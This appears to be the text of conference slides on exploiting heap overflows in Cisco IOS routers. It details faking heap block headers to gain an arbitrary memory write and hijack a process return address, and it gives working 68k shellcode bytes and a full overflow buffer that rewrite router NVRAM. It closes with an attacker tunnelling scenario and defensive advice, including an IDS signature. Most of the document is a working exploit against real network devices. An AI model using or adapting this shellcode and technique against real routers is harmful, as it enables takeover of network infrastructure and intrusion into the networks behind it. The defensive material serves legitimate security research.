! No specific knowledge required
! No limitations for new config
IOS Exploit: Step 9
Getting around PREV
! PREV ptr is checked while the previous 
block is inspected before the free()
! Test seems to be: 
if (next_block->prev!=this_block+20)
abort();
! Perform uncontrolled overflow to cause 
device reboot
! Proves the device is vulnerable
! Puts memory in a predictable state
! Crash information can be obtained from 
network or syslog host if logged 
(contains PREV ptr address)
IOS Exploit: Step 10
The Size field
! Size field in block header is checked
! Bit 31 marks „block in use“
! Usual values such as 0x800000AB are 
not possible because of 0x00 bytes
! Minimum size we could fake is 
0x80010101 = 65793, which is way to 
much
! Solution: 0x7FFFFFFF 
Loops in calculation due to the use of 
32bit fields
IOS Exploit: Step 11
More memory pointers
! Free memory blocks 
carry additional 
management information
! Information is probably 
used to build linked list 
of free memory blocks
! Functionality of FREE 
NEXT and FREE PREV 
comparable to NEXT and 
PREV
MAGIC
Code Address
FREE NEXT
FREE PREV
Size + Usage
mostly 0x01
Padding
MAGIC2 (FREE)
Padding
Padding
IOS Exploit: Step 12
Arbitrary Memory write
! FREE NEXT and FREE PREV 
are not checked
! Pointer exchange takes 
place
! Using 0x7FFFFFFF in the 
size field, we can mark the 
fake block „free“
! Both pointers have to point 
to writeable memory
MAGIC
Code Address
FREE NEXT
FREE PREV
Size + Usage
mostly 0x01
Padding
MAGIC2 (FREE)
Padding
Padding
*free_prev=*free_next;
*(free_next+20)=*free_prev;
IOS Exploit: Step 13
Places for pointers
! ‚show mem proc alloc‘ shows a 
„Process Array“
! Array contains addresses of process 
information records indexed by PID
! Process information record‘s second 
field is current stack pointer
! All of these are static addresses per IOS 
image
Process
Array
Process
Stack
Process
Record
IOS Exploit: Step 14
Taking the Processor
! On the 1000 and 1600 series, the stack 
of any process is accessible for write 
operations by our free pointer game
! The first element on the stack of a 
inactive process is usually the saved SP 
(C calling convention)
! The second element is the saved return 
address
02057EC0:                   02057EE4 080D63D4
02057ED0: 02042E0C 02057FF6 00000000 00000000
02057EE0: 00000000 02057EF0 080DE486 00001388
IOS Exploit: Step 14 [2]
Taking the Processor
! Writing a new stack pointer 
(pointing into a controlled buffer) 
provides multiple possibilities for 
PC redirection
! Writing a new return address is 
smarter – but works only once
02057EC0:                   02057EE4 080D63D4
02057ED0: 02042E0C 02057FF6 00000000 00000000
02057EE0: 00000000 02057EF0 080DE486 00001388
IOS Exploit: Step 15
The Buffer
! A free() on IOS actually 
clears the memory 
(overwrites it with 0x0D) 
! Buffer after fake block is 
considered already clean 
and can be used for 
exploitation
! Position of the buffer 
relative to PREV ptr is 
static per platform/IOS
Host block
Header
Next block
Header
Data
Data
Fake Header
Exploit Buffer
0x0D0D0D0D
0x0D0D0D0D
IOS Exploit: Step 16
The shell code – V1
! Example based on Cisco 1600
! Motorola 68360 QUICC CPU
! Memory protection is set in the 
registers at 0x0FF01000
! Disabling memory protection for NVRAM 
address by modifying the second bit of 
the appropriate QUICC BaseRegister
(See MC68360UM, Page 6-70)
! Write invalid value to NVRAM 
! Device reboots and asks for config
IOS Exploit: Step 16 [2]
The shell code – V1
! Simple code to invalidate NVRAM
(Sorry, we are not @home on 68k)
! Dummy move operation to d1, data 
part of OP code is overwritten on free()
! ADDA trick used to circumvent 0x00 
bytes in code
\x22\x7C\x0F\xF0\x10\xC2    move.l #0x0FF010C2,%a1
\xE2\xD1
lsr
(%a1)
\x22\x7C\x0D\xFF\xFF\xFF    move.l #0x0DFFFFFF,%a1
\xD2\xFC\x02\xD1
adda.w #0x02D1,%a1
\x22\x3C\x01\x01\x01\x01    move.l #0x01010101,%d1
\x22\xBC\xCA\xFE\xBA\xBE    move.l #0xCAFEBABE,(%a1)
IOS Exploit: Step 17
The Cisco 1600 Exploit
! Overflow once to get predictable 
memory layout
! Overflow buffer with
! Fake block and correct PREV ptr
! Size of 0x7FFFFFFF
! FREE NEXT points to code buffer 
! FREE PREV points to return address of 
process „Load Meter“ in stack
! Code to unprotect memory and write into 
NVRAM
IOS Exploit: Step 18
More Information on IOS
! IOS seems to use cooperative 
multitasking (kind of)
! Interrupt driven execution of critical 
tasks
! NVRAM contains config plus header
! 16bit checksum 
! Size of config in bytes
! NVRAM contains stack trace and other 
info from last crash
! Config is seen as on big C string, 
terminated by ‚end‘ and 0x00 bytes
IOS Exploit: Step 19 [1]
The remote shell code
! Append new minimum config to the 
overflow
! Disable interrupts to prevent 
interferences
! Unprotect NVRAM
! Calculate values for NVRAM header
! Write new header and config into 
NVRAM
! Perform clean hard reset operation on 
68360 to prevent stack trace on NVRAM
IOS Exploit: Step 19 [2]
The remote shell code
! 0x00 byte limitation inconvenient
! Buffer size sufficient for more code and 
minimum config
! The classic solution:
! Bootstrap code part contains no 0x00 bytes
! Main shell code is XOR encoded 0xD5 
(0x55 leads to colon character in config)
! Bootstrap code decodes main code and 
continues execution there
IOS Exploit: Step 19 [3]
The remote shell code
! Problem with chip level delays
! NVRAM is on XICOR X68HC64
! Chip requires address lines being 
unchanged during a write operation
! Recommended procedure is polling 
the chips status register – but where 
is this? 
! Solution:
Write operation performed with 
delay loops afterwards
IOS Exploit: Step 19 [4]
The remote shell code
! Code size including fake 
block: 282 bytes
! New config can be 
specified in command line
! Adjustments available 
from command line
! Full source code available 
Bootstrap code
XORed code
New Config
Fake block
Overflow AAA...
...AAAA
http://www.phenoelit.de/ciscoxp/ 
IOS Exploit: Step 19 [5]
The remote shell code
"\xFD\x01\x10\xDF" // RED
"\xAB\x12\x34\xCD" // MAGIC
"\xFF\xFF\xFF\xFF" // PID
"\x80\x81\x82\x83" // ?
"\x08\x0C\xBB\x76" // NAME
"\x80\x8a\x8b\x8c" // ?
"\x02\x0F\x2A\x04" // NEXT 
"\x02\x0F\x16\x94" // PREV 
"\x7F\xFF\xFF\xFF" // SIZE 
"\x01\x01\x01\x01" // ref
"\xA0\xA0\xA0\xA0" // 
"\xDE\xAD\xBE\xEF" // MAGIC2
"\x81\x82\x83\x84" // ? 
"\xFF\xFF\xFF\xFF" // 
"\xFF\xFF\xFF\xFF" //  
"\x02\x0F\x2A\x24" // Fnext
"\x02\x05\x7E\xCC" // Fprev
"\xFD\x01\x10\xDF" // RED
"\xAB\x12\x34\xCD" // MAGIC
"\xFF\xFF\xFF\xFF" // PID
"\x80\x81\x82\x83" // ?
"\x08\x0C\xBB\x76" // NAME
"\x80\x8a\x8b\x8c" // ?
"\x02\x0F\x2A\x04" // NEXT 
"\x02\x0F\x16\x94" // PREV 
"\x7F\xFF\xFF\xFF" // SIZE 
"\x01\x01\x01\x01" // ref
"\xA0\xA0\xA0\xA0" // 
"\xDE\xAD\xBE\xEF" // MAGIC2
"\x81\x82\x83\x84" // ? 
"\xFF\xFF\xFF\xFF" // 
"\xFF\xFF\xFF\xFF" //  
"\x02\x0F\x2A\x24" // Fnext
"\x02\x05\x7E\xCC" // Fprev
"\x22\x7c\x0f\xf0\x10\xc2„
"\xe2\xd1"
"\x47\xfa\x01\x1d"
"\x96\xfc\x01\x01"
"\xe2\xd3"
"\x22\x3c\x01\x01\x01\x01"
"\x45\xfa\x01\x17"
"\x94\xfc\x01\x01"
"\x32\x3c\x55\x55"
loop:
"\xb3\x5a"
"\x0c\x92\xca\xfe\xf0\x0d"
brac:
"\xcc\x01\xff\xf6"
xorc:
"\x22\x7c\x0f\xf0\x10\xc2„
"\xe2\xd1"
"\x47\xfa\x01\x1d"
"\x96\xfc\x01\x01"
"\xe2\xd3"
"\x22\x3c\x01\x01\x01\x01"
"\x45\xfa\x01\x17"
"\x94\xfc\x01\x01"
"\x32\x3c\x55\x55"
loop:
"\xb3\x5a"
"\x0c\x92\xca\xfe\xf0\x0d"
brac:
"\xcc\x01\xff\xf6"
xorc:
IOS Exploit
Work to do
! Other exploits
! Finding differences between the exploits
! Smaller buffer size exploitation 
(external buffer)
! PREV ptr
! Mapping commonly used addresses
! Stabilizing the address
! NVRAM and Config
! Writing to FLASH instead of NVRAM
! Removing stack traces from NVRAM
! Anti-Forensics shell codes
IOS Exploit
Review
! Cisco 1000
! Local network and Remote exploit 
! Return address to code written directly in 
exception handler code
! Cisco 1600, Cisco 2600
! Local network and remote exploit
! Return address to code written to stack
! Cisco 2500 
! Local network via invalid NVRAM
! Remote: no (because of 0x00 bytes)
IOS Exploit
So what?
! Most IOS heap overflows seem to be 
exploitable
! Protocol based exploitation 
! Debug based exploitation
! Network infrastructure still mostly 
unprotected
! NVRAM still contains former config after 
local network exploitation
! Password decryption
! Network structure and routing protocol 
authentication disclosed
IOS Exploit
A scenario
An attacker ...
1. Exploits a router
2. Builds a tunnel (IPsec)
3. Hides himself
4. ... and gets into the network
Internet
Office1
Office2
HQ
1600
1600
Company.Net
IPsec
How to protect
! Do not rely on one type of device for 
protection
! Consider all your networked equipment 
vulnerable to the fullest extent
! Employ all possible protection 
mechanisms a device provides
! Do not ignore equipment because it is 
small, simple, or has not been exploited 
in the past.
! Plan your device management as you 
plan root logins to UNIX systems
How to protect
HP Specific
! Assign passwords
! Admin password
! SNMP read and write community
! PJL protection (gives you time)
! Allow access to port 9100 on printer 
only from print servers
! Remove this.loader from the printer 
(edit /default/csconfig and restart)
! Consider putting your printers behind 
an IP filter device
How to protect
Cisco specific
! Have no overflows in IOS
! Keep your IOS up to date
! Do not run unneeded services (TFTP)
! Tell your IDS about it. Signature: 
\xFD\x01\x10\xDF\xAB\x12\x34\xCD
! debug sanity might stop less 
experienced attackers
! The hard way: config-register 0x00
! Perform logging on a separate segment
! Protect your syslog host